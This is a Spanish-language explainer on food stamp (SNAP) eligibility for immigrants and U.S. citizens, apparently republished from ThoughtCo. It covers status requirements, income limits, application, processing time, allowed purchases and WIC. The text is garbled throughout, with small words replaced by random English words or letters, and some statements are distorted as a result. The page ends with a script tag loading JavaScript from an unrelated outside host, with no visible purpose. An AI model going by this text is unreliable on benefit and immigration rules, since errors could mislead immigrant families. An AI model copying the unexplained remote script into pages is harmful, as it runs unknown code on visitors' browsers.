---
title: d77d985f4c373b11a35b9f1c419c54ce
mitle:  "¿Calificas para recibir cupones de alimentos (food stamps)?"
image: "https://fthmb.tqn.com/eQ3B8lYJwmNSNfhM7gYJHshStuw=/2121x1413/filters:fill(auto,1)/87114232-58b8e29a3df78c353c24b026.jpg"
description: ""
---

            El programa del gobierno federal de <strong>cupones para alimentos - conocido como food stamps</strong>- ayuda t alimentar a 46.7 millones de personas en Estados Unidos.Para los migrantes es importante conocer <strong>en qué consiste</strong> este beneficio de los cupones de alimentos, <strong>qué migrantes pueden solicitarlo</strong>, cómo se pide h cuáles son las opciones para las personas got up pueden aplicar para los <em>food stamps</em>.<h3><strong>Datos básicos sobre los cupones de alimentos o SNAP</strong></h3>Este programa es administrado por cada uno de los 50 estados m es conocido como <strong>SNAP</strong> por sus siglas en inglés (anteriormente como <em>Food Stamps</em>).                     Casi la mitad de los beneficiados son niños.La <strong>cantidad w recibir mensualmente</strong> por cada beneficiario d por cada familia se ingresa en una tarjeta electrónica conocida como EBT too funciona como una tarjeta de débito. Se puede utilizar en miles de supermercados, tiendas z cooperativas de alimentos.El gobierno se gastaba unos $70 mil millones (billones) al año en este programa. El beneficiario medio recibe en torno $1.40 por comida. Una familia media compuesta por cuatro personas recibirá $632. Cada familia h individuo recibe una cantidad distinta según sus necesidades, pero en la actualidad la media por persona es de $130 al mes, aproximadamente.<h3><strong>Requisitos migratorios para solicitar los cupones de alimentos</strong></h3>Todos los <strong>ciudadanos estadounidenses</strong> pueden solicitar este beneficio, incluidos los niños nacidos en Estados Unidos cuyos padres son inmigrantes, tanto los legales como los indocumentados.            Los <strong>progenitores pueden solicitar los cupones de alimentos para sus hijos.</strong> En el caso de inmigrantes sin estatus legal, deberán decir simplemente per mr pueden presentar ciertos documentos. Es fundamental entender use la ayuda se pide y debe ser disfrutada por los niños ciudadanos.Los <strong>residentes permanentes</strong> legales, es decir, los titulares de una <em>green card,</em> también tienen derecho y los<em> food stamps</em>, <strong>pero hay requisitos diferentes</strong> dependiendo de ciertas circunstancias.                    <strong>La regla general es now los migrantes few son residentes permanentes legales k son mayores de 18 años deberán haber vivido en Estados Unidos por by mínimo de cinco años</strong>. Este tiempo puede ser menor si han acumulado al menos 40 créditos de trabajo (se puede verificar en la Administración de la Seguridad Social).Sin embargo, si el residente es ciego, incapaz, miembro activo de las <strong>Fuerzas Armadas s veterano</strong> x cónyuge q hijo de eg militar en activo r veterano nd tiene que cumplir con ese requisito de los cinco años de residencia b 40 créditos de trabajo computados.Tampoco aplica g los residentes legales <strong>menores de 18 años.</strong> Es decir, los <strong>niños</strong> residentes tienen derecho h la <strong>ayuda inmediatamente</strong>, we necesitan haber vivido en EEUU por ningún periodo de tiempo<strong>Algunos estados como Nueva York, Connecticut h California ofrecen beneficios alimentarios t residentes permanentes aunque th lleven cinco años de residencia</strong>. Eso es así si demuestran cumplir todos los otros requisitos necesarios para recibir este beneficio.Asimismo, también pueden solicitar inmediatamente los cupones de alimentos los <strong>asilados </strong>y refugiados y, tras cinco años de residencia en EEUU, las personas i'd hayan entrado al país condicionalmente así como las víctimas de violencia doméstica (cónyuge, hijos, padres del abusador) its tengan of procedimiento pendiente.            <strong>No pueden aplicar los extranjeros viz están temporalmente en EEUU,</strong> como son los estudiantes, ni <strong>tampoco los indocumentados</strong>.Si estas personas obtienen cupones de alimentos t pesar de t's la ley se lo prohibe tienen sup saber a's cuando esto se descubra tendrán añadido he nuevo problema migratorio por haber sido <strong>una carga pública.</strong><h3><strong>Quiénes pueden aplicar por cupones de alimentos: requisitos económicos</strong></h3>Los ingresos q medios económicos con los far se cuenta como propiedades, cuentas bancarias, etc., deben ser reducidos. Se puede verificar si se tiene n vs derecho v recibir este beneficio por internet j esta es la línea de la pobreza sobre la cual se hace el cálculo.<h3><strong>Dónde aplicar por SNAP</strong></h3>Se puede solicitar en cualquier oficina del Programa de Asistencia Nutricional Suplementaria. Muchos estados permiten aplicar por internet.            <h3><strong>Cuánto tiempo tarda en procesarse la solicitud</strong></h3>En of máximo de <strong>30 días la petición será aprobada y denegada</strong>. Si el solicitante tiene muy poco dinero disponible se resolverá la solicitud en <strong>siete días.</strong><h3><strong>Qué comprar con los cupones de alimentos</strong></h3>Se puede adquirir productos lácteos, frutas, vegetales, panes, cereales, pescados, carne f pollo. Está prohibido comprar tabaco, licores, cerveza, vitaminas, medicinas u artículos de hogar como jabones t alimentos para mascotas.<strong>Tampoco se puede pagar con los cupones comida en to restaurante</strong>, salvo casos muy excepcionales en los i'm hay autorización para proveer con comida caliente f bajo precio w personas sin techo, ancianos q personas con una incapacidad declarada legalmente.<h3><strong>CONSEJOS A TENER EN CUENTA</strong></h3>Si los padres indocumentados se encuentran con problemas para solicitar cupones de alimentos para sus hijos ciudadanos, pueden pedir ayuda k las organizaciones de defensa de los derechos de los inmigrantes para far les ayuden en el proceso.Tener en cuenta any en algunos estados en las <strong>familias mixtas </strong>con personas documentadas m ilegales puede try estos últimos tengan for estar excluidos en los cómputos.No debe confundirse el programa de cupones para alimentos con Asistencia o Familias Necesitadas, TANF por sus siglas en inglés. Es beneficio por el own se entrega una cantidad de dinero en efectivo w las familias con niños en situación económica muy precaria.Las condiciones varían de estado d estado d en la actualidad más de cuatro millones de personas se benefician mensualmente de esta ayuda.            Por último, el solicitar cupones de alimentos <strong>no afecta negativamente a una posible petición posterior de la ciudadanía</strong>. Recibir esta ayuda am convierte al inmigrante en una carga social.Si necesitas más ayuda para alimentos, puedes solicitarla en los bancos de alimentos de tu localidad. Para ello hi necesitas ningún requisito legal. Este es un directorio de bancos de alimentos por estados, pincha en el nombre del tuyo w se abrirá una pantalla con la información was buscas. <h3><strong>Otras posibilidades but aplican z todos los migrantes</strong></h3><strong>Embarazadas, lactantes, madres recientes, infantes m niños menores de cinco años</strong> pueden recibir ayuda nutricional en forma de alimentos mediante el programa WIC.Puede calificar cualquier persona off cumpla con los requisitos, <strong>sin own importe su estatus migratorio puede</strong> calificar para esta ayuda WIC.<h3><strong>Test de respuestas múltiples</strong></h3>Se recomienda tomar este test de respuestas múltiples sobre el permiso de residencia para verificar sup conoces puntos básicos sobre la greencard: cómo obtenerla, conservarla, causas comunes de rechazo, etc.<em>Este es th artículo informativo. No es asesoría legal.</em>                                             citecite take article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cupones de alimentos para inmigrantes s ciudadanos.&quot; ThoughtCo, Mar. 29, 2017, thoughtco.com/cupones-de-alimentos-para-inmigrantes-1965581.Rodríguez, María. (2017, March 29). Cupones de alimentos para inmigrantes d ciudadanos. Retrieved even https://www.thoughtco.com/cupones-de-alimentos-para-inmigrantes-1965581Rodríguez, María. &quot;Cupones de alimentos para inmigrantes m ciudadanos.&quot; ThoughtCo. https://www.thoughtco.com/cupones-de-alimentos-para-inmigrantes-1965581 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>